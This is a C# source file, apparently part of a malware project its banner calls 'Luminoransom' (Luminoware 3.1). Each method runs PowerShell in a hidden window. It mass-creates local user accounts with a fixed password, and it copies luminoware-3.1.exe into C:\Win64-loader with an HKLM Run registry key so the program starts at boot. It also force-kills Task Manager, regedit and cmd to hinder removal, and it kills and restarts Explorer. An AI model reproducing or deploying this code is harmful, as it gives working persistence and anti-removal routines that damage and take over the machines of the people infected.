/*




                                                                                                                                                                                                                                                                                             
LLLLLLLLLLL             UUUUUUUU     UUUUUUUUMMMMMMMM               MMMMMMMMIIIIIIIIIINNNNNNNN        NNNNNNNN     OOOOOOOOO               RRRRRRRRRRRRRRRRR                  AAA               NNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS      OOOOOOOOO     MMMMMMMM               MMMMMMMM
L:::::::::L             U::::::U     U::::::UM:::::::M             M:::::::MI::::::::IN:::::::N       N::::::N   OO:::::::::OO             R::::::::::::::::R                A:::A              N:::::::N       N::::::N SS:::::::::::::::S   OO:::::::::OO   M:::::::M             M:::::::M
L:::::::::L             U::::::U     U::::::UM::::::::M           M::::::::MI::::::::IN::::::::N      N::::::N OO:::::::::::::OO           R::::::RRRRRR:::::R              A:::::A             N::::::::N      N::::::NS:::::SSSSSS::::::S OO:::::::::::::OO M::::::::M           M::::::::M
LL:::::::LL             UU:::::U     U:::::UUM:::::::::M         M:::::::::MII::::::IIN:::::::::N     N::::::NO:::::::OOO:::::::O          RR:::::R     R:::::R            A:::::::A            N:::::::::N     N::::::NS:::::S     SSSSSSSO:::::::OOO:::::::OM:::::::::M         M:::::::::M
  L:::::L                U:::::U     U:::::U M::::::::::M       M::::::::::M  I::::I  N::::::::::N    N::::::NO::::::O   O::::::O            R::::R     R:::::R           A:::::::::A           N::::::::::N    N::::::NS:::::S            O::::::O   O::::::OM::::::::::M       M::::::::::M
  L:::::L                U:::::D     D:::::U M:::::::::::M     M:::::::::::M  I::::I  N:::::::::::N   N::::::NO:::::O     O:::::O            R::::R     R:::::R          A:::::A:::::A          N:::::::::::N   N::::::NS:::::S            O:::::O     O:::::OM:::::::::::M     M:::::::::::M
  L:::::L                U:::::D     D:::::U M:::::::M::::M   M::::M:::::::M  I::::I  N:::::::N::::N  N::::::NO:::::O     O:::::O            R::::RRRRRR:::::R          A:::::A A:::::A         N:::::::N::::N  N::::::N S::::SSSS         O:::::O     O:::::OM:::::::M::::M   M::::M:::::::M
  L:::::L                U:::::D     D:::::U M::::::M M::::M M::::M M::::::M  I::::I  N::::::N N::::N N::::::NO:::::O     O:::::O            R:::::::::::::RR          A:::::A   A:::::A        N::::::N N::::N N::::::N  SS::::::SSSSS    O:::::O     O:::::OM::::::M M::::M M::::M M::::::M
  L:::::L                U:::::D     D:::::U M::::::M  M::::M::::M  M::::::M  I::::I  N::::::N  N::::N:::::::NO:::::O     O:::::O            R::::RRRRRR:::::R        A:::::A     A:::::A       N::::::N  N::::N:::::::N    SSS::::::::SS  O:::::O     O:::::OM::::::M  M::::M::::M  M::::::M
  L:::::L                U:::::D     D:::::U M::::::M   M:::::::M   M::::::M  I::::I  N::::::N   N:::::::::::NO:::::O     O:::::O            R::::R     R:::::R      A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N       SSSSSS::::S O:::::O     O:::::OM::::::M   M:::::::M   M::::::M
  L:::::L                U:::::D     D:::::U M::::::M    M:::::M    M::::::M  I::::I  N::::::N    N::::::::::NO:::::O     O:::::O            R::::R     R:::::R     A:::::::::::::::::::::A     N::::::N    N::::::::::N            S:::::SO:::::O     O:::::OM::::::M    M:::::M    M::::::M
  L:::::L         LLLLLL U::::::U   U::::::U M::::::M     MMMMM     M::::::M  I::::I  N::::::N     N:::::::::NO::::::O   O::::::O            R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N            S:::::SO::::::O   O::::::OM::::::M     MMMMM     M::::::M
LL:::::::LLLLLLLLL:::::L U:::::::UUU:::::::U M::::::M               M::::::MII::::::IIN::::::N      N::::::::NO:::::::OOO:::::::O          RR:::::R     R:::::R   A:::::A             A:::::A   N::::::N      N::::::::NSSSSSSS     S:::::SO:::::::OOO:::::::OM::::::M               M::::::M
L::::::::::::::::::::::L  UU:::::::::::::UU  M::::::M               M::::::MI::::::::IN::::::N       N:::::::N OO:::::::::::::OO           R::::::R     R:::::R  A:::::A               A:::::A  N::::::N       N:::::::NS::::::SSSSSS:::::S OO:::::::::::::OO M::::::M               M::::::M
L::::::::::::::::::::::L    UU:::::::::UU    M::::::M               M::::::MI::::::::IN::::::N        N::::::N   OO:::::::::OO             R::::::R     R:::::R A:::::A                 A:::::A N::::::N        N::::::NS:::::::::::::::SS    OO:::::::::OO   M::::::M               M::::::M
LLLLLLLLLLLLLLLLLLLLLLLL      UUUUUUUUU      MMMMMMMM               MMMMMMMMIIIIIIIIIINNNNNNNN         NNNNNNN     OOOOOOOOO               RRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS        OOOOOOOOO     MMMMMMMM               MMMMMMMM
                                                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                             
     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
                                                                                                                                                                                                                                                                                           
      



                                                                                                                                                                                                                                                                                             
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CMD
{
    internal class CMD_class
    {



        public void Users_Chiants(int nombre_util)
        {
            int f = 0;

            while (f < nombre_util)
            {
                try
                {
                    System.Threading.Thread.Sleep(1000);
                    Process mtd = new Process();
                    mtd.StartInfo.FileName = "powershell.exe";
                    mtd.StartInfo.Arguments = "/C net user Lumino2.0-YT-" + f + " Lumino-S /add";
                    mtd.StartInfo.UseShellExecute = true;
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    mtd.Start();
                    mtd.Close();

                }
                catch (System.IO.FileNotFoundException) { };
                f++;
            }
            
            
        }



        public void Registry_Copy()
        {
            try
            {
                System.Threading.Thread.Sleep(1000);
                Process mtd = new Process();
                mtd.StartInfo.FileName = "powershell.exe";
                mtd.StartInfo.Arguments = "/C mkdir C:\\Win64-loader & reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Luminoware-3.1 /t REG_SZ /d C:\\Win64-loader\\luminoware-3.1.exe & copy luminoware-3.1.exe C:\\Win64-loader\\ & copy ASCII.bmp C:\\Win64-loader\\";
                mtd.StartInfo.UseShellExecute = true;
                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                mtd.Start();
                mtd.Close();

            }
            catch (System.IO.FileNotFoundException) { };


        }
        public void CMD_rtd()
        {
            try
            {
                Process mtd = new Process();
                mtd.StartInfo.FileName = "powershell.exe";
                mtd.StartInfo.Arguments = "/C taskkill /f /im taskmgr.exe & taskkill /f /im regedit.exe & taskkill /f /im cmd.exe";
                mtd.StartInfo.UseShellExecute = true;
                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                mtd.Start();
                mtd.Close();
            }
            catch (System.UnauthorizedAccessException) { }
        }

        public void CMD_killExplorer()
        {
            try
            {
                Process mtd1 = new Process();
                mtd1.StartInfo.FileName = "powershell.exe";
                mtd1.StartInfo.Arguments = "/C taskkill /f /im explorer.exe";
                mtd1.StartInfo.UseShellExecute = true;
                mtd1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                mtd1.Start();
                mtd1.Close();
            }
            catch (System.UnauthorizedAccessException) { }

        }
        public void CMD_startExplorer()
        {
            try
            {
                Process mtd2 = new Process();
                mtd2.StartInfo.FileName = "powershell.exe";
                mtd2.StartInfo.Arguments = "/C start explorer.exe";
                mtd2.StartInfo.UseShellExecute = true;
                mtd2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                mtd2.Start();
                mtd2.Close();
            }
            catch (System.UnauthorizedAccessException) { }

        }

    }
}
